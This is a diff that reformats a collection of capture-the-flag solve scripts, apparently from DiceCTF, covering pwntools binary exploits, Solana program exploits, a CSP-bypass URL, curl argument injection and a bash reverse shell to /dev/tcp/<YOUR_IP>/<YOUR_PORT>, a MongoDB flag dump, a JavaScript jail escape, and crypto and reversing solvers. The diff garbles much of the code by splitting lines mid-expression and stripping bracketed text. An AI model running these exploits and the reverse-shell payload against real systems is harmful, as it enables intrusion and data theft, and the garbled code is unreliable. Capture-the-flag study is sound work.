@@ -7,7 +7,7 @@
 ```
 from pwn import *
 
-#p = process('bop')
+    #p = process('bop')
 p = remote('mc.ax', 30284)
 
 pay = b'a'*32 + p64(0x404120-0x8)
@@ -67,37 +67,37 @@ p.sendline(pay)
 p.sendline(p64(0x0061616161616161))
 
 p.interactive()
-```
-
-
-
-```
 #[account(
     constraint = password.key().as_ref()[..4] == b"osec"[..]
 )]
 pub password: AccountInfo<'info>,
-```
-
-
-
-```
-use anchor_lang::prelude::*;
-use anchor_spl::token::Token;
+use anchor_lang::
+prelude::*;
+use anchor_spl::
+token::
+Token;
 declare_id!("osecio1111111111111111111111111111111111111");
 #[program]
 pub mod solve {
     use super::*;
 
     pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {
-        let get_flag_acc = chall::cpi::accounts::GetFlag {
-            flag:ctx.accounts.state.to_account_info(),
+        let get_flag_acc = chall::
+cpi::
+accounts::
+GetFlag {
+            flag:
+ctx.accounts.state.to_account_info(),
             password: ctx.accounts.password.to_account_info(),
             payer: ctx.accounts.payer.to_account_info(),
             system_program: ctx.accounts.system_program.to_account_info(),
             rent: ctx.accounts.rent.to_account_info(),
         };
-        let cpi_deposit = CpiContext::new(ctx.accounts.chall.to_account_info(), get_flag_acc);
-        chall::cpi::get_flag(cpi_deposit)?;
+        let cpi_deposit = CpiContext::
+new(ctx.accounts.chall.to_account_info(), get_flag_acc);
+        chall::
+cpi::
+get_flag(cpi_deposit)?;
         Ok(())
     }
 }
@@ -111,22 +111,31 @@ pub struct GetFlag<'info> {
     pub system_program: Program<'info, System>,
     pub token_program: Program<'info, Token>,
     pub rent: Sysvar<'info, Rent>,
-    pub chall: Program<'info, chall::program::Chall>
+    pub chall: Program<'info, chall::
+program::
+Chall>
 }
-```
-
-
-
-```
-use chall::anchor_lang::{InstructionData, ToAccountMetas};
-use chall::FLAG_SEED;
-use solana_program::pubkey;
-use solana_program::pubkey::Pubkey;
-use std::net::TcpStream;
-use std::{error::Error, fs, io::prelude::*, io::BufReader, str::FromStr};
+use chall::
+anchor_lang::{InstructionData, ToAccountMetas};
+use chall::
+FLAG_SEED;
+use solana_program::
+pubkey;
+use solana_program::
+pubkey::
+Pubkey;
+use std::
+net::
+TcpStream;
+use std::{error::
+Error, fs, io::
+prelude::*, io::
+BufReader, str::
+FromStr};
 
 fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>> {
-    let mut line = String::new();
+    let mut line = String::
+new();
     reader.read_line(&mut line)?;
 
     let ret = line
@@ -140,35 +149,51 @@ fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn
 }
 
 fn main() -> Result<(), Box<dyn Error>> {
-    let mut stream = TcpStream::connect("127.0.0.1:8080")?;
-    let mut reader = BufReader::new(stream.try_clone().unwrap());
-    let mut line = String::new();
-    let so_data = fs::read("./solve/target/deploy/solve.so")?;
+    let mut stream = TcpStream::
+connect("127.0.0.1:
+8080")?;
+    let mut reader = BufReader::
+new(stream.try_clone().unwrap());
+    let mut line = String::
+new();
+    let so_data = fs::
+read("./solve/target/deploy/solve.so")?;
     reader.read_line(&mut line)?;
     writeln!(stream, "{}", solve::ID)?;
     reader.read_line(&mut line)?;
     writeln!(stream, "{}", so_data.len())?;
     stream.write_all(&so_data)?;
     let chall_id = chall::ID;
-    let user = Pubkey::from_str(&get_line(&mut reader)?)?;
-    let ix = solve::instruction::GetFlag {};
+    let user = Pubkey::
+from_str(&get_line(&mut reader)?)?;
+    let ix = solve::
+instruction::
+GetFlag {};
     let data = ix.data();
-    let password = Pubkey::from_str("8W4K4D8y1y7nXqNAYc3CtBMWj1dFDJRxrSbqffLTSg8u")?;
-    let state = Pubkey::find_program_address(&[FLAG_SEED], &chall_id).0;
-    let ix_accounts = solve::accounts::GetFlag {
+    let password = Pubkey::
+from_str("8W4K4D8y1y7nXqNAYc3CtBMWj1dFDJRxrSbqffLTSg8u")?;
+    let state = Pubkey::
+find_program_address(&[FLAG_SEED], &chall_id).0;
+    let ix_accounts = solve::
+accounts::
+GetFlag {
         state,
         password: password,
         payer: user,
         token_program: spl_token::ID,
         chall: chall_id,
-        system_program: solana_program::system_program::ID,
-        rent: solana_program::sysvar::rent::ID,
+        system_program: solana_program::
+system_program::ID,
+        rent: solana_program::
+sysvar::
+rent::ID,
     };
     let metas = ix_accounts.to_account_metas(None);
     reader.read_line(&mut line)?;
     writeln!(stream, "{}", metas.len())?;
     for meta in metas {
-        let mut meta_str = String::new();
+        let mut meta_str = String::
+new();
         meta_str.push('m');
         if meta.is_writable {
             meta_str.push('w');
@@ -193,24 +218,17 @@ fn main() -> Result<(), Box<dyn Error>> {
     }
     Ok(())
 }
-```
-
-
-
-```
 state.x += amt;
 state.y += amt;
 
 state.x += state.fee * state.x / 100;
 state.y += state.fee * state.y / 100;
-```
+use anchor_lang::
+prelude::*;
 
-
-
-```
-use anchor_lang::prelude::*;
-
-use anchor_spl::token::Token;
+use anchor_spl::
+token::
+Token;
 declare_id!("osecio1111111111111111111111111111111111111");
 
 #[program]
@@ -219,24 +237,36 @@ pub mod solve {
 
     pub fn get_flag(ctx: Context<GetFlag>) -> Result<()> {
 
-        let auth_fee_accounts = chall::cpi::accounts::AuthFee{
+        let auth_fee_accounts = chall::
+cpi::
+accounts::
+AuthFee{
             state: ctx.accounts.state.to_account_info(),
             payer: ctx.accounts.payer.to_account_info(),
             system_program: ctx.accounts.system_program.to_account_info(),
             rent: ctx.accounts.rent.to_account_info(),
         };
-        let cpi_set_fee = CpiContext::new(ctx.accounts.chall.to_account_info(), auth_fee_accounts);
-        chall::cpi::set_fee(cpi_set_fee, -100)?;
+        let cpi_set_fee = CpiContext::
+new(ctx.accounts.chall.to_account_info(), auth_fee_accounts);
+        chall::
+cpi::
+set_fee(cpi_set_fee, -100)?;
 
         // swap
-        let swap_accounts = chall::cpi::accounts::Swap{
+        let swap_accounts = chall::
+cpi::
+accounts::
+Swap{
             state: ctx.accounts.state.to_account_info(),
             payer: ctx.accounts.payer.to_account_info(),
             system_program: ctx.accounts.system_program.to_account_info(),
             rent: ctx.accounts.rent.to_account_info(),
         };
-        let cpi_swap = CpiContext::new(ctx.accounts.chall.to_account_info(), swap_accounts);
-        chall::cpi::swap(cpi_swap, -1000000)?;
+        let cpi_swap = CpiContext::
+new(ctx.accounts.chall.to_account_info(), swap_accounts);
+        chall::
+cpi::
+swap(cpi_swap, -1000000)?;
 
         Ok(())
     }
@@ -251,14 +281,11 @@ pub struct GetFlag<'info> {
     pub system_program: Program<'info, System>,
     pub token_program: Program<'info, Token>,
     pub rent: Sysvar<'info, Rent>,
-    pub chall: Program<'info, chall::program::Chall>
+    pub chall: Program<'info, chall::
+program::
+Chall>
 }
-```
-
-
-
-```
-#include "./exploit.h"
+    #include "./exploit.h"
 
 int global_fd;
 
@@ -283,11 +310,6 @@ int main() {
 
   return 0;
 }
-```
-
-
-
-```
 <?php
   if (isset($_GET["source"])) highlight_file(__FILE__) && die();
 
@@ -304,21 +326,16 @@ int main() {
   <head>
     <title>recursive-csp</title>
   </head>
-  <body>
+  
     <h1>Hello, <?php echo $name ?>!</h1>
     <h3>Enter your name:</h3>
     <form method="GET">
-      <input type="text" placeholder="name" name="name" />
-      <input type="submit" />
+      
+      
     </form>
     <!-- /?source -->
-  </body>
+  
 </html>
-```
-
-
-
-```
 import crc from "crc/crc32";
 
 const target = "e8b7be43";
@@ -343,11 +360,6 @@ for (const a of printables) {
     }
   }
 }
-```
-
-
-
-```
 # DICE 1001
 # Homework 3
 #
@@ -395,11 +407,6 @@ def preimage(hash):
 
 def magic():
     ...
-```
-
-
-
-```
 {
     '__name__': '__main__', 
     '__doc__': None, 
@@ -417,35 +424,33 @@ def magic():
     'TextTestRunner': <class 'unittest.runner.TextTestRunner'>, 
     'SilentResult': <class 'util.SilentResult'>, 
     'SubmissionImporter': <class 'util.SubmissionImporter'>, 
-    'suite': <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[None, 
-        None, 
-        <test_1_add.TestAdd testMethod=test_add_positive>]>, 
-        <unittest.suite.TestSuite tests=[]>]>, 
-        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
-        <unittest.suite.TestSuite tests=[<test_2_longest.TestLongest testMethod=test_longest_empty>, 
+    'suite': ]>, 
+        ]>, 
+        , 
+        , 
         <test_2_longest.TestLongest testMethod=test_longest_multiple>, 
         <test_2_longest.TestLongest testMethod=test_longest_multiple_tie>, 
         <test_2_longest.TestLongest testMethod=test_longest_single>]>]>, 
-        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
-        <unittest.suite.TestSuite tests=[<test_3_common.TestCommon testMethod=test_common_consecutive>, 
+        , 
+        , 
         <test_3_common.TestCommon testMethod=test_common_empty>, 
         <test_3_common.TestCommon testMethod=test_common_many>, 
         <test_3_common.TestCommon testMethod=test_common_nonconsecutive>, 
         <test_3_common.TestCommon testMethod=test_common_single>]>]>, 
-        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
-        <unittest.suite.TestSuite tests=[<test_4_favorite.TestFavorite testMethod=test_favorite>]>]>, 
-        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
-        <unittest.suite.TestSuite tests=[<test_5_factor.TestFactor testMethod=test_factor_bigger>, 
+        , 
+        ]>]>, 
+        , 
+        , 
         <test_5_factor.TestFactor testMethod=test_factor_large>, 
         <test_5_factor.TestFactor testMethod=test_factor_small>]>]>, 
-        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
-        <unittest.suite.TestSuite tests=[<test_6_preimage.TestPreimage testMethod=test_preimage_a>, 
+        , 
+        , 
         <test_6_preimage.TestPreimage testMethod=test_preimage_b>]>]>, 
-        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, 
-        <unittest.suite.TestSuite tests=[<test_7_magic.TestMagic testMethod=test_magic_a>, 
+        , 
+        , 
         <test_7_magic.TestMagic testMethod=test_magic_b>, 
         <test_7_magic.TestMagic testMethod=test_magic_c>]>]>, 
-        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<test_8_hidden.TestHidden testMethod=test_hidden>]>]>]>, 
+        ]>]>]>, 
     'tests': [
         'test_hidden', 
         'test_magic_a', 
@@ -471,10 +476,7 @@ def magic():
         'test_add_positive'
     ], 
     'stack': [], 
-    'current': <unittest.suite.TestSuite tests=[
-        None, 
-        None, 
-        <test_1_add.TestAdd testMethod=test_add_positive>
+    'current': 
     ]>, 
     'test': <test_1_add.TestAdd testMethod=test_add_positive>, 
     'submission': 'import __main__rnrndef add(a, b):rn    raise BaseException(vars(__main__))', 
@@ -482,11 +484,6 @@ def magic():
     'stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>, 
     'stderr': <_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>
 }
-```
-
-
-
-```
 const csp = [
         "default-src 'none'",
         "style-src 'unsafe-inline'",
@@ -498,11 +495,6 @@ const csp = [
     }
 
     res.header('Content-Security-Policy', csp.join('; '));
-```
-
-
-
-```
 <script>
     const code = new URL(window.location.href).searchParams.get('code');
     if (code) {
@@ -517,41 +509,16 @@ const csp = [
     const flag = localStorage.getItem('flag') ?? "flag{test_flag}";
     document.getElementById('flag').innerHTML = `<h1>${flag}</h1>`;
 </script>
-```
-
-
-
-```
-https://codebox.mc.ax/?code=<img+src="111%3brequire-trusted-types-for+'script'%3breport-uri+http://csp.example.com%3b">
-```
-
-
-
-```
+https://codebox.mc.ax/?code=
 const code = new URL(window.location.href).searchParams.get('code');
-```
-
-
-
-```
 app.post("/api/login", async (req, res) => { //...
 app.post("/api/ping", requiresLogin, (req, res) => { // ..
-```
-
-
-
-```
 const requiresLogin = (req, res, next) => {
     if (!req.session.user) {
         res.redirect("/?error=You need to be logged in");
     }
     next();
 };
-```
-
-
-
-```
 const args = [ url ];
     let { opt, data } = req.body;
     if (opt && data && typeof opt === "string" && typeof data === "string") {
@@ -569,39 +536,14 @@ const args = [ url ];
         // TODO: save result to database
         res.json({ success: true, message: `The site is ${code === 0 ? 'up' : 'down'}` });
     });
-```
-
-
-
-```
 curl http(s)://<任意URL> -d <任何内容>
 curl http(s)://<任意URL> -<一个字母> <GET或者POST>
-```
-
-
-
-```
 create-dirs
 output="/home/user/.node_modules/kerberos.js"
-```
-
-
-
-```
 require('child_process').exec('bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1"')
-```
-
-
-
-```
 const { MongoClient } = require("mongodb");
 const cp = require('child_process');
 const express = require("express");
-```
-
-
-
-```
 WORKDIR /app
 COPY package.json ./
 COPY static ./static
@@ -612,17 +554,8 @@ RUN useradd -ms /bin/bash user
 USER user
 
 CMD ["/bin/sh", "-c", "while true; do node app.js; done"]
-```
-
-
-
-```
-node -e '(async _ =>{const { MongoClient } = require("mongodb"); const client = new MongoClient("mongodb://mongodb:27017/"); q = await client.db("secret").collection("flag").find().toArray(); console.log(q);})()'
-```
-
-
-
-```
+node -e '(async _ =>{const { MongoClient } = require("mongodb"); const client = new MongoClient("mongodb://mongodb:
+27017/"); q = await client.db("secret").collection("flag").find().toArray(); console.log(q);})()'
 (() => {
   const c = (name, tar = {}) => new Proxy(
     tar,
@@ -643,14 +576,10 @@ node -e '(async _ =>{const { MongoClient } = require("mongodb"); const
   );
   return c('a', {});
 })()
-```
-
-
-
-```
 const endpoint = `https://jwtjail-fcf2ebccc5f50f79.mc.ax`
 const jwt = require('jsonwebtoken')
-// const endpoint = `http://localhost:12345`
+// const endpoint = `http://localhost:
+12345`
 
 const token = jwt.sign({}, 'a')
 
@@ -711,11 +640,6 @@ fetch(endpoint + `/api/verify`, {
 })
   .then((res) => res.text())
   .then(console.log)
-```
-
-
-
-```
 ...
 def encrypt(pk0, pk1, msg):
     r = urandom(16)
@@ -738,11 +662,6 @@ def encrypt(pk0, pk1, msg):
                     exit(0)
                 print(decrypt(key0, key1, in_ct).hex())
 ...
-```
-
-
-
-```
 from pwn import *
 import os
 from Crypto.Util.strxor import strxor
@@ -756,7 +675,8 @@ def enc(io,m0,m1):
     io.recvuntil(b'm1 (16 byte hexstring):')
     io.sendline(m1.hex().rjust(32).encode())
     ret = io.recvline().strip()
-    c1 = bytes.fromhex(ret[:512].decode())
+    c1 = bytes.fromhex(ret[:
+512].decode())
     c2 = bytes.fromhex(ret[512:].decode())
     return c1,c2
 
@@ -794,22 +714,12 @@ io = remote("mc.ax",31493)
 for _ in trange(128):
     exp(io)
 io.interactive()
-```
-
-
-
-```
 p,b = 
 PR.<a> = PolynomialRing(GF(p))
 rng = lambda x: (a*x + b)
 f = rng(rng(rng(11))) - 11
 
 a1 = f.roots()[0][0]
-```
-
-
-
-```
 from Crypto.Util.number import *
 R = [ , , ]
 C = [ , , ]
@@ -830,11 +740,6 @@ ff=Q(ff)
 ff=ff.monic()
 
 print(ff.small_roots(X=2 ** (8 * (53) ) , epsilon=0.03))
-```
-
-
-
-```
 from pwn import * 
 from Crypto.Util.number import *
 import random
@@ -882,11 +787,6 @@ while 1:
         print(tmpn)
         print(ret)
         io.interactive()
-```
-
-
-
-```
 import time
 from Crypto.Util.number import *
 from Crypto.Cipher import PKCS1_OAEP
@@ -897,26 +797,27 @@ tmp = 802966039520312076693793941589976109745211001401969304148696848539792582
 c = 78039359365505830647863120097048278336840870881044130853869085319746050397290701173568458387165336669015392542436720204471746699941342744320642504097261279786910084930105137187694980137555480280357169445825986853526650060940129246485308585373751953485082957347620734091036672512753659098246781542640682747549
 q = (GCD(tmp-m,N))
 p = N // q
-```
-
-
-
-```
 ...
     def unpad(self, ct_int):
         """Decrypt a message with PKCS#1 OAEP.
 
-        :param ciphertext: The encrypted message.
-        :type ciphertext: bytes/bytearray/memoryview
+        :
+param ciphertext: The encrypted message.
+        :
+type ciphertext: bytes/bytearray/memoryview
 
-        :returns: The original message (plaintext).
-        :rtype: bytes
+        :
+returns: The original message (plaintext).
+        :
+rtype: bytes
 
-        :raises ValueError:
+        :
+raises ValueError:
             if the ciphertext has the wrong length, or if decryption
             fails the integrity check (in which case, the decryption
             key is probably wrong).
-        :raises TypeError:
+        :
+raises TypeError:
             if the RSA key has no private half (i.e. you are trying
             to decrypt using a public key).
         """
@@ -935,7 +836,8 @@ p = N // q
         y = em[0]
         # y must be 0, but we MUST NOT check it here in order not to
         # allow attacks like Manger's (http://dl.acm.org/citation.cfm?id=704143)
-        maskedSeed = em[1:hLen+1]
+        maskedSeed = em[1:
+hLen+1]
         maskedDB = em[hLen+1:]
         # Step 3c
         seedMask = self._mgf(maskedDB, hLen)
@@ -947,22 +849,19 @@ p = N // q
         db = strxor(maskedDB, dbMask)
         # Step 3g
         one_pos = hLen + db[hLen:].find(b'x01')
-        lHash1 = db[:hLen]
+        lHash1 = db[:
+hLen]
         invalid = bord(y) | int(one_pos < hLen)
         hash_compare = strxor(lHash1, lHash)
         for x in hash_compare:
             invalid |= bord(x)
-        for x in db[hLen:one_pos]:
+        for x in db[hLen:
+one_pos]:
             invalid |= bord(x)
         if invalid != 0:
             raise ValueError("Incorrect decryption.")
         # Step 4
         return db[one_pos + 1:]
-```
-
-
-
-```
 key = RSA.construct((q*p, e))
 cipher = PKCS1_OAEP.new(key)  
 
@@ -998,7 +897,8 @@ def decrypt(proot, qroot, p, q):
             assert (pow(m,e,N) == c)
             try:
                 print( cipher.unpad((m)))
-            except:
+            
+except:
                 continue
 
 def main():
@@ -1022,11 +922,6 @@ def main():
 
 if __name__ == '__main__':
     main()
-```
-
-
-
-```
 from sage.all import *
 import numpy as np
 from time import time
@@ -1045,7 +940,8 @@ encrypt_A=data['encrypt_A'].tolist()
 encrypt_b=data['encrypt_b'].tolist()
 
 def pk_Aexpress(pk_A):
-    pkA_1 = pk_A[:512,:]
+    pkA_1 = pk_A[:
+512,:]
     pkA_2 = pk_A[512:,:]
     ks = []
     for row in pkA_2:
@@ -1056,12 +952,17 @@ def fuck(A,pk_A):
     c_tmp = pk_A.solve_left(A)[:-100]
     print("nstart to express")
     tmpks = pk_Aexpress(pk_A)
-    ks = tmpks[:,:100]
+    ks = tmpks[:,:
+100]
     print(" express done ")
-    ks = ks.stack(Matrix(ZZ,[c_tmp[:100]]))
+    ks = ks.stack(Matrix(ZZ,[c_tmp[:
+100]]))
     M = Matrix(ZZ,100 + 100 + 1,100 + 100 + 1)
-    M[:101,:101] = identity_matrix(101)  
-    M[:101,101:] = ks
+    M[:
+101,:
+101] = identity_matrix(101)  
+    M[:
+101,101:] = ks
     M[101:,101:] = q * identity_matrix(100)
     start_time = time()
     print("start to LLL")
@@ -1069,7 +970,8 @@ def fuck(A,pk_A):
     rows = ML[0]
     print(f"LLL done at {time()-start_time}")
     c_new = [0 for i in range(612)]
-    c_list = Matrix(ZZ,Matrix(GF(q),rows[:100]*tmpks) + Integer(rows[100]) * Matrix(GF(q),c_tmp))[0]
+    c_list = Matrix(ZZ,Matrix(GF(q),rows[:
+100]*tmpks) + Integer(rows[100]) * Matrix(GF(q),c_tmp))[0]
     for _ in range(512):
         if c_list[_] == q-1:
             c_new[_] = -1
@@ -1090,7 +992,8 @@ for _ in trange(5,len(encrypt_A)-1):
     b = encrypt_b[_]
     c_new = fuck(A,pk_A)
 
-    c_first = c_new[:512]
+    c_first = c_new[:
+512]
     c_secon = c_new[512:]
 
     c = vector(ZZ, c_first+c_secon)
@@ -1117,11 +1020,6 @@ for _ in trange(5,len(encrypt_A)-1):
     print(_,flag_bytes)
 
 a = [112, 117, 98, 108, 105] + [99, 45, 107, 101, 121] + [45, 108, 101, 97, 114] + [110, 105, 110, 103, 45] + [119, 105, 116, 104, 45] + [101, 97, 115, 101, 95] + [98,100,50,102,102] + [97,99,48,53,57,50,101]
-```
-
-
-
-```
 def keygen():
     priv = ctypes.create_string_buffer(PRIVATE_KEY_SIZE)
     pub = ctypes.create_string_buffer(PUBLIC_KEY_SIZE)
@@ -1145,11 +1043,6 @@ class Alice:
         
 mask = ctypes.create_string_buffer(bytes.fromhex(mask_hex), PUBLIC_KEY_SIZE)
 enc0, enc1 = alice.encrypt(mask)
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 import ctypes
@@ -1194,11 +1087,6 @@ msg1 = stream(enc1, ss1)
 flag = strxor(msg0, msg1)
 print(flag)
 # dice{b0p_it_pul1_1t_6op_it_pull_1t_pu1l_1t_b0p_it}
-```
-
-
-
-```
 from pwn import *
 import os
 from Crypto.Util.strxor import strxor
@@ -1213,7 +1101,8 @@ def enc(io,m0,m1):
     io.recvuntil(b'm1 (16 byte hexstring):')
     io.sendline(m1.hex().rjust(32).encode())
     ret = io.recvline().strip()
-    c1 = bytes.fromhex(ret[:512].decode())
+    c1 = bytes.fromhex(ret[:
+512].decode())
     c2 = bytes.fromhex(ret[512:].decode())
     return c1,c2
 
@@ -1261,11 +1150,6 @@ io = remote("mc.ax",31497)
 for _ in trange(128):
     exp(io)
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 
 leak = open('./input.bin', 'rb').read()
@@ -1295,7 +1179,8 @@ def recur(mat, col_id, status):
             bit_flipping = -bit_flipping
         hehe[col_id][status] = v5
         return v5
-    except:
+    
+except:
         print(col_id, status)
         exit(-1)
 
@@ -1304,7 +1189,8 @@ for i in range(64):
     matrix = []
     for j in range(x):
         start = (650 * i + 1 + 36 * j) * 4
-        t = leak[start:start+0x90]
+        t = leak[start:
+start+0x90]
         k = []
         for z in range(x):
             k.append(u64(t[z*8:(z+1)*8]))
@@ -1314,24 +1200,20 @@ for i in range(64):
     res = recur(matrix, 0, 0)
     # print(res)
     start = (650 * i + 649) * 4
-    print(chr((u64(leak[start:start+8]) - res + i) & 0xff), end = '')
-```
-
-
-
-```
-#include <algorithm>
-#include <exception>
-#include <fstream>
-#include <functional>
-#include <iostream>
-#include <math.h>
-#include <stdlib.h>
-#include <vector>
+    print(chr((u64(leak[start:
+start+8]) - res + i) & 0xff), end = '')
+    #include <algorithm>
+    #include <exception>
+    #include <fstream>
+    #include <functional>
+    #include 
+    #include <math.h>
+    #include <stdlib.h>
+    #include <vector>
 using namespace std;
 
-void work(vector<int> &data, int th_num) {
-  vector<function<int(int, int)>> funcs{
+void work(vector &data, int th_num) {
+  vector<function> funcs{
       [](int x, int y) { return x + y; },
       [](int x, int y) { return x * y; },
       [](int x, int y) { return x ^ y; },
@@ -1361,8 +1243,8 @@ void work(vector<int> &data, int th_num) {
   }
 }
 
-void rev_work(vector<int> &data, int th_num) {
-  vector<function<int(int, int)>> funcs{
+void rev_work(vector &data, int th_num) {
+  vector<function> funcs{
       [](int x, int y) { return x - y; },
       [](int x, int y) {
         if (y == 0)
@@ -1398,12 +1280,12 @@ void rev_work(vector<int> &data, int th_num) {
 
 int main() {
   ifstream fin("flag.out");
-  vector<int> data;
+  vector data;
   int x;
   while (fin >> x)
     data.push_back(x);
   for (int num = 1; num < 10; ++num) {
-    vector<int> a = data;
+    vector a = data;
     try {
       rev_work(a, num);
     } catch (overflow_error) {
@@ -1416,11 +1298,6 @@ int main() {
   }
   return 0;
 }
-```
-
-
-
-```
 org = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"'
 a = 'VRiPyfC7Ih3XxrK6HcsGFoSTlkW9e2!BuNJZAp10En45qjOYb"azQwDmUMdgv8tL'
 
@@ -1430,11 +1307,6 @@ for i in range(len(a)):
     print(target[a.index(org[i])], end = '')
     
 # dice{P4ral1isM_m4kEs_eV3ryt4InG_sUp3r_f4ST_aND_s3CuRE_a17m4k9l4}
-```
-
-
-
-```
 from qiskit import QuantumCircuit, Aer, execute
 from qiskit import ClassicalRegister
 cr = ClassicalRegister(400,'c')
@@ -1450,29 +1322,19 @@ job = simulator.run(qc, shots=8192)
 result = job.result()
 print(result)
 print(result.get_counts())
-```
-
-
-
-```
 ...
 0x00000000000646963657b636c6966666f72642d7468652d6269672d7175616e74756d2d646f672d3139653366357d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 ...
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <intrin.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <stdint.h>
+    #include 
 
 typedef __uint128_t _OWORD;
 typedef uint64_t _QWORD;
 typedef uint8_t _BYTE;
 
-#define LOBYTE(x) (*((_BYTE*)&(x)))
+    #define LOBYTE(x) (*((_BYTE*)&(x)))
 
 _OWORD *__fastcall emu(
         _OWORD *a1,
@@ -1497,11 +1359,6 @@ int main() {
     printf("%p %p %pn", res.p, res.q, res.unk);
     return 0;
 }
-```
-
-
-
-```
 x, t, n = '', '0', 0
 for c in '132111311112211112213111513211222213121222213211221111223112131122311151313223113112121131115221121115121211221121232132112241115131121313223122111113112':
     c = int(c)
@@ -1515,12 +1372,7 @@ flag = bytearray()
 for i in range(0, len(x), 8):
     flag.append(int(x[i:i+8], 2))
 print(flag.decode())
-#ru57_r3v3r51ng_w1th_4_m4cr0_tw15t
-```
-
-
-
-```
+    #ru57_r3v3r51ng_w1th_4_m4cr0_tw15t
 hehe0 = 'ef2**ya**ba5'
 hehe1 = 'pud3**17i__'
 hehe2 = '1nb**iydt8f'
@@ -1573,11 +1425,6 @@ for i in range(len(hehe7)):
     test[x] = hehe7[i]
 
 print(''.join(test))
-```
-
-
-
-```
 flag = "11223"
 magic = {'1': 123, '2': 456, '3': 789}
 for k in magic.keys():
@@ -1586,21 +1433,11 @@ for k in magic.keys():
         if flag[i] == k:
             s = 101 * s + i + 1
     assert magic[k] == s
-```
-
-
-
-```
 magic = {}
 lst = [False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, 319496, False, 2184867, 21925933, 422628, 14733726, 555, False, 4695, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, 320588772, False, 4798, 3775, 1163, 1349, 2565, 4295, False, False, False, False, False, 2044, 433, 660, 964, 1066, False, False, 11733, 226772, False, False, False, False, 764, False, False, False, False, False, False]
 for idx, elem in enumerate(lst):
     if elem:
         magic[chr(idx)] = elem
-```
-
-
-
-```
 flag = "???????"
 magic = {'.': 319496, '0': 2184867, '1': 21925933, '2': 422628, '3': 14733726, '4': 555, '6': 4695, '_': 320588772, 'a': 4798, 'b': 3775, 'c': 1163, 'd': 1349, 'e': 2565, 'f': 4295, 'l': 2044, 'm': 433, 'n': 660, 'o': 964, 'p': 1066, 's': 11733, 't': 226772, 'y': 764}
 for k in magic.keys():
@@ -1609,11 +1446,6 @@ for k in magic.keys():
         if flag[i] == k:
             s = 101 * s + i + 1
     assert magic[k] == s
-```
-
-
-
-```
 magic = {'.': 319496, '0': 2184867, '1': 21925933, '2': 422628, '3': 14733726, '4': 555, '6': 4695, '_': 320588772, 'a': 4798, 'b': 3775, 'c': 1163, 'd': 1349, 'e': 2565, 'f': 4295, 'l': 2044, 'm': 433, 'n': 660, 'o': 964, 'p': 1066, 's': 11733, 't': 226772, 'y': 764}
 flag = bytearray(b'x00'*100)
 for k, s in magic.items():
@@ -1624,11 +1456,6 @@ for k, s in magic.items():
     for v in vals:
         flag[v] = ord(k)
 print(bytes(flag).rstrip(b'x00'))
-```
-
-
-
-```
 print(dir(MagicDict))
 
 ['__class__', '__contains__', '__copy__', '__delattr__', '__delitem__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__missing__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'clear', 'copy', 'default_factory', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']
@@ -1636,17 +1463,7 @@ print(dir(MagicDict))
 print(dir(MagicDict.__init__))
 
 ['__annotations__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
-```
-
-
-
-```
 the time, {0.headers} replaced by 0.headers.__class__.__init.__globals__
-```
-
-
-
-```
 import rpyc
 from types import CodeType
 
